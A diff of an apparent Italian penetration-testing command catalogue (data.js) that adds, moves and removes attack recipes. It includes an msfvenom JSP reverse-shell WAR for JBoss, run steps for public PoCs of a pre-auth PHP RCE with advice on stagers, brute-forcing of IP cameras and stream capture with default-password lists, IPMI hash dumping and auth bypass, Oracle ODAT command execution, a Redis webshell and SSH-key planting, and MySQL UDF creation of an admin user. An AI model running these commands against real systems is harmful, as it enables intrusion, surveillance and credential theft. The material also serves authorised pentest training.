@@ -1,4 +1,4 @@
-/* data.js — generato da WannaHack il 2026-11-06T14:15:02.090Z */
+/* data.js — generato da WannaHack il 2026-11-09T14:20:02.415Z */
 const COMMANDS = [
   {
     "id": "whois-domain",
@@ -3599,6 +3599,73 @@ const COMMANDS = [
         "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/jenkins.html"
       }
     ]
+  },
+  {
+    "id": "jboss-rce",
+    "name": "JBoss — deploy WAR / RCE",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "App Server",
+    "description": "`JBoss`/WildFly espone console amministrative che permettono il deploy di una WAR malevola → RCE. Su JBoss 4-6 i vettori classici sono `/jmx-console`, `/web-console/Invoker` e l’HTTP Invoker, spesso senza autenticazione; su EAP/WildFly si usa la management console (porta 9990, spesso `admin:admin`). `jexboss` rileva e sfrutta questi vettori in automatico.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "jboss",
+      "wildfly",
+      "jmx",
+      "rce",
+      "deploy"
+    ],
+    "template": "jexboss -host http://<ip>:<port>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "port",
+        "label": "Porta",
+        "placeholder": "8080"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.3"
+      },
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "443"
+      }
+    ],
+    "variants": [
+      {
+        "id": "jexboss",
+        "label": "jexboss (auto)",
+        "template": "jexboss -host http://<ip>:<port>",
+        "description": "Scanner/exploit automatico: rileva e sfrutta JMX console, HTTP Invoker, Struts2 e le servlet di deploy. La via più rapida su JBoss legacy."
+      },
+      {
+        "id": "war",
+        "label": "WAR payload (deploy manuale)",
+        "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war -o shell.war",
+        "description": "Genera la WAR da caricare via /jmx-console (JBoss 4-6) o management console EAP/WildFly (9990). Poi apri /shell/ per la reverse shell."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Exploit Notes — JBoss",
+        "url": "https://exploit-notes.hdks.org/exploit/web/jboss/"
+      }
+    ],
+    "note": "# Vettori\n- `/jmx-console` e `/web-console/Invoker` (JBoss 4-6): deploy WAR, spesso unauth\n- HTTP Invoker (`/invoker/JMXInvokerServlet`): deserializzazione Java\n- EAP/WildFly: management console su 9990 (`admin:admin`)\n# Enum rapido\n`curl -s http://<ip>:<port>/jmx-console/` → se risponde senza login, deploy diretto."
   },
   {
     "id": "gitlab-userenum",
@@ -7603,6 +7670,267 @@ const COMMANDS = [
     "note": "# Windows ≠ Linux\nIl trucco Linux (`python pty`, `stty raw -echo`) non produce una PTY su Windows. La shell interattiva vera, su Windows 10 / Server 2019+, si ottiene con **ConPtyShell** (API ConPTY).\n# ConPtyShell (reverse, consigliato)\n- Sul Kali apri il listener in raw passando le dimensioni: `stty raw -echo; (stty size; cat) | nc -lvnp <lport>`\n- Sul target carica ed esegui `Invoke-ConPtyShell <lhost> <lport>`: ottieni frecce, TAB, `cls` e programmi interattivi.\n- Al rientro `reset` ripulisce il tuo terminale.\n# Senza ConPTY: cambia canale\nCon credenziali o hash, molto meglio abbandonare la shell grezza:\n- `evil-winrm -i <ip> -u <user> -p <pass>` (o `-H <hash>`) — PowerShell remoting stabile, con upload/download\n- RDP: `xfreerdp /v:<ip> /u:<user> /p:<pass>`\n- Meterpreter: sessione stabile, poi `migrate` su un processo affidabile\n# Nota\npenelope auto-upgrada solo le shell Unix: su Windows gestisce la sessione ma non dà una PTY."
   },
   {
+    "id": "php2shell",
+    "name": "PHP — php2shell (CVE-2026-109618/109619)",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "PHP (80/443)",
+    "description": "**php2shell** sfrutta due RCE pre-auth nel core di PHP. \n\n**CVE-2026-109618** è una corruzione di memoria dopo un out-of-memory: un `longjmp()` lascia la memoria in uno stato invalido che la fase di shutdown rilegge. \n\n**CVE-2026-109619** è uno use-after-free da stato globale di richiesta che sopravvive alla liberazione della memoria e viene usato prima della re-inizializzazione.\n\nSenza alcuna credenziale, una sequenza di richieste HTTP, porta all'esecuzione di comandi con i privilegi del worker web, di norma `www-data`.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "php",
+      "php2shell",
+      "cve-2026-109618",
+      "cve-2026-109619",
+      "rce",
+      "pre-auth",
+      "uaf"
+    ],
+    "template": "# scarica il PoC (CVE-2026-109618, SAPI Apache mod_php)\ngit clone https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC\ncd php2shell-CVE-2026-109618-CVE-2026-109619-PoC\n\n# esegue il comando sul target (max 14 byte inline) e salva la prova su file\npython3 poc_109618.py -u http://<ip> -c '<cmd>' --proof-file out/p1",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.15"
+      },
+      {
+        "key": "cmd",
+        "label": "Comando (≤ 14 byte)",
+        "placeholder": "id>/out/p1"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "eness — script singolo (109618)",
+        "template": "# scarica il PoC (CVE-2026-109618, SAPI Apache mod_php)\ngit clone https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC\ncd php2shell-CVE-2026-109618-CVE-2026-109619-PoC\n\n# esegue il comando sul target (max 14 byte inline) e salva la prova su file\npython3 poc_109618.py -u http://<ip> -c '<cmd>' --proof-file out/p1",
+        "description": "Lo script più diretto: un solo file, mirato a CVE-2026-109618 su Apache prefork + mod_php. Su una build diversa da Debian 12 (immagine `php:8.4.26-apache`) vanno passati `--zif-offset`/`--dtor-offset`; con `--fetch /p1.txt` recupera via HTTP l'output del comando."
+      },
+      {
+        "id": "devploit",
+        "label": "devploit — Apache + FPM",
+        "template": "# prepara il repo (clona l'exploit upstream in vendor/)\ngit clone https://github.com/devploit/php2shell\ncd php2shell && python3 tools/bootstrap_upstream.py\n\n# dispatcher automatico: rileva versione e SAPI ed esegue (target remoto: aggiungi --allow-remote --arch amd64)\npython3 tools/php2shell_auto.py -u http://<ip> -c '<cmd>'",
+        "description": "Toolkit con matrice di versioni per Apache mod_php e PHP-FPM, costruito attorno all'exploit upstream di 9bie. `--list` elenca i profili, `--allow-remote` abilita i bersagli remoti, `--arch`/`--profile` forniscono gli offset del binario. I profili FPM sono riportati dai contributor: va rifatta la calibrazione per ciascun host."
+      },
+      {
+        "id": "ikow",
+        "label": "ikow — 5 chain (A-E)",
+        "template": "# clona il repo: 5 chain (A-E) alternative, divise per SAPI/precondizione + regole di detection\ngit clone https://github.com/ikow/php2shell-poc\ncd php2shell-poc\n\n# 1) verifica quale via è percorribile (uno script per chain)\npython3 poc/verify_session_injection.py --target http://<ip>   # -> chain A\npython3 poc/verify_handler_mismatch.py --target http://<ip>    # -> chain C (FPM)\npython3 poc/verify_fpm_stale_state.py --target http://<ip>     # -> chain E (FPM)\npython3 poc/verify_oom_trigger.py --host <ip> --port 80        # -> chain D (mod_php)\n\n# 2) esegui UNA sola chain, in base all'esito del verify\n# A  session injection -> LFI (pre-auth; serve un sink LFI nell'app; tutti i SAPI)\npython3 exploit/chain_a_session_lfi.py --host <ip> --port 80 --command '<cmd>'\n# C  handler mismatch -> __destruct (pre-auth; FPM con due dir a serialize_handler diverso)\npython3 exploit/chain_c_mismatch_rce.py --host <ip> --port 80 --command '<cmd>'\n# B  var_destroy UAF -> handler overwrite (NON pre-auth: richiede già unserialize() o una webshell)\nphp exploit/chain_b_uaf_rce.php\n# D, E  OOM/stale state -> RCE (pre-auth, app-independent; nel repo solo i verify, l'exploit è a pagamento)",
+        "description": "Cinque catene alternative (A-E) divise per SAPI/precondizione: nel repo c'è il codice di A, B e C, mentre D ed E hanno solo lo script di verify (l'exploit è riservato agli abbonati). Prima i `verify_*` dicono quale via è aperta, poi se ne lancia UNA. A richiede un sink LFI nell'app; B non è pre-auth (serve già `unserialize()` o una webshell); C ed E sono per FPM; D è mod_php e indipendente dall'app. Include anche regole di detection pronte (Suricata, Sigma, ModSecurity), utili lato difesa."
+      },
+      {
+        "id": "offsec-edb",
+        "label": "OffSec — EDB-52704 (8.5.11)",
+        "template": "# scarica il PoC da Exploit-DB (EDB-52704, autore OffSec) nella cartella corrente\nsearchsploit -m 52704\n\n# esegue il comando sul target (endpoint di default /index.php); con --rce senza valore lancia un id di prova e verifica /proof.txt\npython3 52704.py --host <ip> --rce '<cmd>'",
+        "description": "Il PoC pubblicato da OffSec su Exploit-DB (EDB-52704, 22/10/2026): un unico script Python3 (solo stdlib) validato su PHP 8.5.11 + Apache mod_php prefork, che funziona anche con ASLR attivo ricavando gli indirizzi dal cookie `PHPSESSID` leakato. `searchsploit -m 52704` lo scarica. Comando limitato a ~47 caratteri. Molto build-specific: su un binario diverso da quello validato gli offset vanno ricalibrati a mano (GDB/ROPgadget)."
+      }
+    ],
+    "refs": [
+      {
+        "label": "CVE-2026-109618 — GHSA-w8hw-w9fx-j79w (RCE via OOM corruption)",
+        "url": "https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w"
+      },
+      {
+        "label": "CVE-2026-109619 — GHSA-6wmf-4rv5-p3rp (RCE via stale global state)",
+        "url": "https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp"
+      },
+      {
+        "label": "PoC — eness (CVE-2026-109618, Apache)",
+        "url": "https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC"
+      },
+      {
+        "label": "PoC/toolkit — devploit (Apache + FPM, matrice versioni)",
+        "url": "https://github.com/devploit/php2shell"
+      },
+      {
+        "label": "PoC — ikow (5 chain + regole di detection)",
+        "url": "https://github.com/ikow/php2shell-poc"
+      },
+      {
+        "label": "PoC — OffSec / Exploit-DB (EDB-52704, validato su PHP 8.5.11)",
+        "url": "https://www.exploit-db.com/exploits/52704"
+      },
+      {
+        "label": "Wiz Research — analisi php2shell",
+        "url": "https://www.wiz.io/blog/php2shell-php-rce"
+      }
+    ],
+    "note": "# Versioni vulnerabili\n**Rami supportati**:\n- affetti **< 8.2.35**, **< 8.3.36**, **< 8.4.27**, **< 8.5.12**\n- corrette in `8.2.35`, `8.3.36`, `8.4.27`, `8.5.12` (e `8.6.0 RC4`)\n\n<br>\n**Rami EOL**\n- affetti **5.4.0** (2012) a **8.1.x**\n- corrette per `7.4`, `8.0`, `8.1`\n- nessun fix per `5.4`→`7.3`\n\n<br>La versione del target si legge dagli header `X-Powered-By` o `Server`, quando non rimossi.\n# Prerequisiti\n- Nessuna credenziale: basta raggiungere via HTTP un qualunque endpoint PHP del target\n- SAPI: resa massima su Apache mod_php (prefork); su PHP-FPM è dimostrata la via del session upload progress\n- `session.upload_progress.enabled` è On di default ed è il trigger indipendente dall'app per la via CVE-2026-109619\n- Target remoti: servono gli offset del binario (ASLR); i PoC pubblici sono tarati su build e configurazioni di laboratorio precise (spesso un solo worker, `memory_limit` basso)\n# Limitazioni\n- Comando inline limitato a **14 byte** sui target remoti: per comandi più lunghi o una reverse shell si scrive uno stager su file e lo si concatena\n- Offset per-build: su target remoti diversi dalla build di laboratorio vanno forniti a mano (`--zif-offset`/`--dtor-offset` in eness, `--arch`/`--profile` in devploit)\n- La riuscita dipende da SAPI, numero di worker, `memory_limit` e `display_errors`: \"nessuna prova non significa assenza di esecuzione\"\n- eness e il PoC OffSec (EDB-52704) sono PoC per CVE-2026-109618; per CVE-2026-109619 il percorso dimostrato è il session upload progress, coperto da ikow e devploit\n# Dall'RCE alla shell\nL'esecuzione è one-shot e corta. Per una shell stabile: scrivi uno stager sul webroot con un primo comando, poi richiamalo via HTTP (`--fetch` in eness), oppure usa lo stager per scaricare ed eseguire una reverse shell verso un listener.\n# Attenzione\nTecnica distruttiva e rumorosa: l'exploit forza ripetuti out-of-memory che fanno crashare i worker PHP (su Apache uccide i processi figli) e riempie i log di errori 500/OOM. Nessuno stealth. Solo su sistemi in scope e autorizzati."
+  },
+  {
+    "id": "rtsp-cameradar",
+    "name": "RTSP — cameradar (auto)",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "RTSP (554/8554)",
+    "description": "Tool automatico per telecamere RTSP: scopre gli host, indovina i path di stream e fa il brute delle credenziali di default. La via più rapida per accedere a una camera.\n- `--targets` = target (IP, CIDR, range o hostname)\n- `--ports` = porte custom (default 554)\n- `--net=host` = flag Docker, così il container raggiunge la rete del target",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "rtsp"
+    ],
+    "tags": [
+      "rtsp",
+      "camera",
+      "cameradar",
+      "brute"
+    ],
+    "template": "docker run --rm -t --net=host ullaakut/cameradar --targets <ip>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "refs": [
+      {
+        "label": "Cameradar — GitHub",
+        "url": "https://github.com/Ullaakut/cameradar"
+      }
+    ],
+    "note": "# Output atteso\nPer ogni camera cameradar riporta la route (path dello stream) e le credenziali trovate.\n# Prossimo passo\nCon path e credenziali apri o registra il flusso (vedi RTSP — apri/cattura stream). Le camere spesso rivelano aree interne o credenziali mostrate a schermo."
+  },
+  {
+    "id": "rtsp-stream",
+    "name": "RTSP — apri/cattura stream",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "RTSP (554/8554)",
+    "description": "Con un path valido e (se servono) le credenziali, apri o cattura il flusso video della camera. Le virgolette proteggono `?` e `&` nell'URL.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "rtsp"
+    ],
+    "tags": [
+      "rtsp",
+      "camera",
+      "ffmpeg",
+      "stream"
+    ],
+    "template": "ffplay 'rtsp://<user>:<password>@<ip>:554/<path>'",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "admin"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "admin"
+      },
+      {
+        "key": "path",
+        "label": "Stream path",
+        "placeholder": "Streaming/Channels/101"
+      }
+    ],
+    "variants": [
+      {
+        "id": "view",
+        "label": "Guarda (ffplay)",
+        "template": "ffplay 'rtsp://<user>:<password>@<ip>:554/<path>'",
+        "description": "Apre il flusso in tempo reale."
+      },
+      {
+        "id": "grab",
+        "label": "Cattura frame (ffmpeg)",
+        "template": "ffmpeg -i 'rtsp://<user>:<password>@<ip>:554/<path>' -frames:v 1 frame.jpg",
+        "description": "Salva un singolo fotogramma come prova, senza aprire la finestra."
+      },
+      {
+        "id": "vlc",
+        "label": "VLC",
+        "template": "vlc 'rtsp://<user>:<password>@<ip>:554/<path>'",
+        "description": "Apre lo stream in VLC."
+      }
+    ],
+    "note": "# Path RTSP comuni\n- Hikvision: `/Streaming/Channels/101`\n- Dahua: `/cam/realmonitor?channel=1&subtype=0`\n- Generici: `/live.sdp`, `/h264`, `/mpeg4`, `/video1`\n# Credenziali di default\n- `admin:admin` · `admin:12345` · `admin:` (vuota) · `root:root` · Dahua `888888:888888`\nQuando il path è ignoto, `cameradar` lo individua da solo.",
+    "refs": [
+      {
+        "label": "HackTricks — 554 Pentesting RTSP",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/554-8554-pentesting-rtsp.html"
+      }
+    ]
+  },
+  {
+    "id": "ipmi-dumphash",
+    "name": "IPMI — dump & crack hash",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "IPMI (623/udp)",
+    "description": "IPMI 2.0 ha una falla di progetto nel protocollo RAKP: il BMC restituisce un hash della password di qualsiasi utente valido prima dell'autenticazione, quindi si estrae offline. Alcuni BMC accettano anche Cipher 0, che bypassa del tutto l'autenticazione. Gli hash si crackano con hashcat mode 7300.",
+    "note": "# Credenziali di default\nDefault dei BMC per la Cipher 0 / login web: `ADMIN:ADMIN` (Supermicro) · `root:calvin` (Dell iDRAC) · `USERID:PASSW0RD` (IBM/Lenovo, con lo zero) · `Administrator:admin` (HP iLO) · `admin:admin` · `root:root`.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "ipmi"
+    ],
+    "tags": [
+      "ipmi",
+      "bmc",
+      "rakp"
+    ],
+    "template": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run; exit\"",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "wordlist",
+        "label": "Wordlist",
+        "placeholder": "/usr/share/wordlists/rockyou.txt"
+      }
+    ],
+    "variants": [
+      {
+        "id": "msf",
+        "label": "Dump hash (Metasploit)",
+        "template": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run; exit\"",
+        "description": "Estrae gli hash RAKP degli utenti del BMC. Salva l'output in formato `user:hash` per hashcat."
+      },
+      {
+        "id": "crack",
+        "label": "Crack (hashcat 7300)",
+        "template": "hashcat -m 7300 ipmi.hash <wordlist>",
+        "description": "Cracka gli hash RAKP estratti. Le password di default dei BMC (es. `ADMIN`) cadono subito."
+      },
+      {
+        "id": "cipher0",
+        "label": "Cipher 0 (auth bypass)",
+        "template": "ipmitool -I lanplus -C 0 -H <ip> -U Administrator -P '' user list",
+        "description": "Con Cipher 0 alcuni BMC eseguono comandi con qualsiasi password. Se funziona, si possono creare utenti amministrativi."
+      }
+    ]
+  },
+  {
     "id": "mssql-xpcmdshell",
     "name": "MSSQL — xp_cmdshell RCE",
     "category": "exploitation",
@@ -7780,6 +8108,53 @@ const COMMANDS = [
       }
     ],
     "note": "# Output atteso\nL'enumerazione elenca i linked server; la query remota rivela con quale login giri sull'altro host, a volte più privilegiato di quello locale.\n# Prossimo passo\nSe sul linked server sei sysadmin, puoi abilitare ed eseguire `xp_cmdshell` lì tramite `EXECUTE('...') AT [server]`, saltando sull'altra istanza."
+  },
+  {
+    "id": "odat-rce",
+    "name": "ODAT — lettura file e RCE Oracle",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "Oracle (1521)",
+    "description": "Con credenziali valide ODAT trasforma l'accesso al database in lettura/scrittura di file sul server e in esecuzione di comandi, tramite UTL_FILE, external table o DBMS_SCHEDULER.",
+    "note": "# Prerequisito\nUn SID e credenziali con privilegi adeguati (spesso basta un utente con ruoli comuni). Verifica prima i privilegi con le query di enumerazione.\n# Output atteso\nexternal table e DBMS_SCHEDULER puntano all'esecuzione comandi; UTL_FILE alla lettura/scrittura file. Scegli in base ai privilegi disponibili.",
+    "platform": "linux",
+    "requires": [
+      "password"
+    ],
+    "protocols": [
+      "oracle"
+    ],
+    "tags": [
+      "oracle",
+      "odat",
+      "rce"
+    ],
+    "template": "# lettura di un file dal server via UTL_FILE\nodat utlfile -s <ip> -d <sid> -U <user> -P '<password>' --getFile /tmp out.txt\n\n# esecuzione comandi via external table\nodat externaltable -s <ip> -d <sid> -U <user> -P '<password>' --exec /tmp whoami",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "system"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "oracle"
+      },
+      {
+        "key": "sid",
+        "label": "SID",
+        "placeholder": "XE"
+      }
+    ]
   },
   {
     "id": "mysql-queries",
@@ -8025,7 +8400,7 @@ const COMMANDS = [
         "id": "udf-win",
         "label": "UDF sys_exec (.dll)",
         "template": "# ------------------------------------------------------------\n#  PREP (sulla tua macchina): ottieni lib_mysqludf_sys_64.dll\n# ------------------------------------------------------------\n#  de-cloak da sqlmap (la DLL ha un _ finale):\npython3 /usr/share/sqlmap/extra/cloak/cloak.py -d \\\n    -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_\n\n# ------------------------------------------------------------\n#  SCENARIO\n# ------------------------------------------------------------\n#  CASO A: la .dll è già nel plugin_dir del target\n#          (copiata con una shell)  →  salta al passo 3\n#\n#  CASO B: hai solo la connessione MySQL  →  convertila in hex\n#          e scrivila con DUMPFILE (passi 1-2, scrive come il servizio)\nxxd -p lib_mysqludf_sys_64.dll | tr -d '\\n'\n\n# ============================================================\n#  Dal client MySQL\n# ============================================================\n\n# 1) dove va caricata la DLL\nSELECT @@plugin_dir;\n\n# 2) scrivi la UDF nel plugin_dir  (CASO B)\nSELECT 0x<hex> INTO DUMPFILE '<plugindir>/lib_mysqludf_sys_64.dll';\n\n# 3) registra sys_exec, esegui (blind) e crea un admin locale\n#    sys_exec ritorna il codice di uscita: 0 = comando riuscito\nCREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys_64.dll';\nSELECT sys_exec('net user pwn Pwn123! /add');\nSELECT sys_exec('net localgroup administrators pwn /add');\n\n# ------------------------------------------------------------\n#  Accesso remoto: aggiungi il gruppo richiesto\n#  NOTA: Administrators NON include automaticamente i gruppi remoti\n# ------------------------------------------------------------\n#  WinRM / evil-winrm\nSELECT sys_exec('net localgroup \"Remote Management Users\" pwn /add');\n\n#  RDP\nSELECT sys_exec('net localgroup \"Remote Desktop Users\" pwn /add');",
-        "description": "La UDF è una `.dll` e la funzione è `sys_exec`, che ritorna un int: esecuzione cieca, nessun output (0 = comando riuscito). Poiché il servizio gira spesso come LocalSystem i comandi vanno a SYSTEM: crea un admin locale (`net user` e `net localgroup administrators`). L'appartenenza ai gruppi di accesso remoto non è automatica: per rientrare aggiungi (o verifica) `Remote Management Users` per evil-winrm, oppure `Remote Desktop Users` per l'RDP."
+        "description": "La UDF è una `.dll` e la funzione è `sys_exec`, che ritorna un int: esecuzione blind, nessun output (0 = comando riuscito). Poiché il servizio gira spesso come LocalSystem i comandi vanno a SYSTEM: crea un admin locale (`net user` e `net localgroup administrators`). L'appartenenza ai gruppi di accesso remoto non è automatica: per rientrare aggiungi (o verifica) `Remote Management Users` per evil-winrm, oppure `Remote Desktop Users` per l'RDP."
       },
       {
         "id": "sqlmap",
@@ -8040,256 +8415,6 @@ const COMMANDS = [
         "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
       }
     ]
-  },
-  {
-    "id": "rtsp-cameradar",
-    "name": "RTSP — cameradar (auto)",
-    "category": "exploitation",
-    "subcategory": "infrastructure",
-    "group": "RTSP (554/8554)",
-    "description": "Tool automatico per telecamere RTSP: scopre gli host, indovina i path di stream e fa il brute delle credenziali di default. La via più rapida per accedere a una camera.\n- `--targets` = target (IP, CIDR, range o hostname)\n- `--ports` = porte custom (default 554)\n- `--net=host` = flag Docker, così il container raggiunge la rete del target",
-    "platform": "linux",
-    "requires": [
-      "no-creds"
-    ],
-    "protocols": [
-      "rtsp"
-    ],
-    "tags": [
-      "rtsp",
-      "camera",
-      "cameradar",
-      "brute"
-    ],
-    "template": "docker run --rm -t --net=host ullaakut/cameradar --targets <ip>",
-    "params": [
-      {
-        "key": "ip",
-        "label": "Target",
-        "ctx": "ip",
-        "placeholder": "10.10.10.11"
-      }
-    ],
-    "refs": [
-      {
-        "label": "Cameradar — GitHub",
-        "url": "https://github.com/Ullaakut/cameradar"
-      }
-    ],
-    "note": "# Output atteso\nPer ogni camera cameradar riporta la route (path dello stream) e le credenziali trovate.\n# Prossimo passo\nCon path e credenziali apri o registra il flusso (vedi RTSP — apri/cattura stream). Le camere spesso rivelano aree interne o credenziali mostrate a schermo."
-  },
-  {
-    "id": "rtsp-stream",
-    "name": "RTSP — apri/cattura stream",
-    "category": "exploitation",
-    "subcategory": "infrastructure",
-    "group": "RTSP (554/8554)",
-    "description": "Con un path valido e (se servono) le credenziali, apri o cattura il flusso video della camera. Le virgolette proteggono `?` e `&` nell'URL.",
-    "platform": "cross-platform",
-    "requires": [
-      "no-creds"
-    ],
-    "protocols": [
-      "rtsp"
-    ],
-    "tags": [
-      "rtsp",
-      "camera",
-      "ffmpeg",
-      "stream"
-    ],
-    "template": "ffplay 'rtsp://<user>:<password>@<ip>:554/<path>'",
-    "params": [
-      {
-        "key": "ip",
-        "label": "Target",
-        "ctx": "ip",
-        "placeholder": "10.10.10.11"
-      },
-      {
-        "key": "user",
-        "label": "User",
-        "ctx": "user",
-        "placeholder": "admin"
-      },
-      {
-        "key": "password",
-        "label": "Password",
-        "ctx": "password",
-        "placeholder": "admin"
-      },
-      {
-        "key": "path",
-        "label": "Stream path",
-        "placeholder": "Streaming/Channels/101"
-      }
-    ],
-    "variants": [
-      {
-        "id": "view",
-        "label": "Guarda (ffplay)",
-        "template": "ffplay 'rtsp://<user>:<password>@<ip>:554/<path>'",
-        "description": "Apre il flusso in tempo reale."
-      },
-      {
-        "id": "grab",
-        "label": "Cattura frame (ffmpeg)",
-        "template": "ffmpeg -i 'rtsp://<user>:<password>@<ip>:554/<path>' -frames:v 1 frame.jpg",
-        "description": "Salva un singolo fotogramma come prova, senza aprire la finestra."
-      },
-      {
-        "id": "vlc",
-        "label": "VLC",
-        "template": "vlc 'rtsp://<user>:<password>@<ip>:554/<path>'",
-        "description": "Apre lo stream in VLC."
-      }
-    ],
-    "note": "# Path RTSP comuni\n- Hikvision: `/Streaming/Channels/101`\n- Dahua: `/cam/realmonitor?channel=1&subtype=0`\n- Generici: `/live.sdp`, `/h264`, `/mpeg4`, `/video1`\n# Credenziali di default\n- `admin:admin` · `admin:12345` · `admin:` (vuota) · `root:root` · Dahua `888888:888888`\nQuando il path è ignoto, `cameradar` lo individua da solo.",
-    "refs": [
-      {
-        "label": "HackTricks — 554 Pentesting RTSP",
-        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/554-8554-pentesting-rtsp.html"
-      }
-    ]
-  },
-  {
-    "id": "redis-rce",
-    "name": "Redis — RCE via CONFIG SET",
-    "category": "exploitation",
-    "subcategory": "infrastructure",
-    "group": "Redis (6379)",
-    "description": "Se Redis è aperto e il processo può scrivere sul filesystem, `CONFIG SET dir` più `dbfilename` reindirizzano il file di dump dove serve: si scrive una webshell nel web root o una chiave pubblica in `authorized_keys` per una shell SSH. Il salvataggio effettivo avviene con `SAVE`.",
-    "platform": "linux",
-    "requires": [
-      "no-creds"
-    ],
-    "protocols": [
-      "redis"
-    ],
-    "tags": [
-      "redis",
-      "rce",
-      "webshell"
-    ],
-    "template": "# sposta la directory di dump nella web root\nredis-cli -h <ip> config set dir /var/www/html\n\n# chiama il dump shell.php, così il web server lo esegue come PHP\nredis-cli -h <ip> config set dbfilename shell.php\n\n# scrive la webshell dentro una chiave\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\n\n# forza il salvataggio: il file compare nella web root\nredis-cli -h <ip> save",
-    "params": [
-      {
-        "key": "ip",
-        "label": "IP",
-        "ctx": "ip",
-        "placeholder": "10.10.10.11"
-      }
-    ],
-    "variants": [
-      {
-        "id": "webshell",
-        "label": "Webshell (web root)",
-        "template": "# sposta la directory di dump nella web root\nredis-cli -h <ip> config set dir /var/www/html\n\n# chiama il dump shell.php, così il web server lo esegue come PHP\nredis-cli -h <ip> config set dbfilename shell.php\n\n# scrive la webshell dentro una chiave\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\n\n# forza il salvataggio: il file compare nella web root\nredis-cli -h <ip> save",
-        "description": "Scrive `shell.php` nel web root: la RCE parte da `http://<ip>/shell.php?c=id`. Serve conoscere un path servito da un web server e scrivibile dal processo redis."
-      },
-      {
-        "id": "sshkey",
-        "label": "Chiave SSH",
-        "template": "# genera una coppia di chiavi SSH senza passphrase\nssh-keygen -t rsa -f ./key -q -N ''\n\n# imbottisce la chiave pubblica di newline, per non corrompere il file finale\n(echo; cat key.pub; echo) > key.txt\n\n# svuota il database, così il dump contiene solo la chiave\nredis-cli -h <ip> flushall\n\n# carica la chiave pubblica dentro una chiave Redis\ncat key.txt | redis-cli -h <ip> -x set sshkey\n\n# sposta la directory di dump in /root/.ssh\nredis-cli -h <ip> config set dir /root/.ssh\n\n# chiama il dump authorized_keys\nredis-cli -h <ip> config set dbfilename authorized_keys\n\n# salva: la chiave finisce tra le authorized_keys di root\nredis-cli -h <ip> save\n\n# entra via SSH come root con la chiave privata\nssh -i key root@<ip>",
-        "description": "Scrive la propria chiave pubblica in `/root/.ssh/authorized_keys` (o nella home di un altro utente) per una shell SSH. Funziona se il processo redis gira come quell'utente e la dir esiste."
-      }
-    ],
-    "note": "# Prerequisiti\nRedis raggiungibile senza autenticazione (o con password nota) e un processo che può scrivere su disco. Il salvataggio effettivo del file avviene con `SAVE`.\n# Errori comuni\nLa webshell funziona solo se conosci un path servito da un web server e scrivibile dal processo redis. La chiave SSH funziona se redis gira come quell'utente e la cartella `.ssh` esiste."
-  },
-  {
-    "id": "php2shell",
-    "name": "PHP — php2shell (CVE-2026-109618/109619)",
-    "category": "exploitation",
-    "subcategory": "infrastructure",
-    "group": "PHP (80/443)",
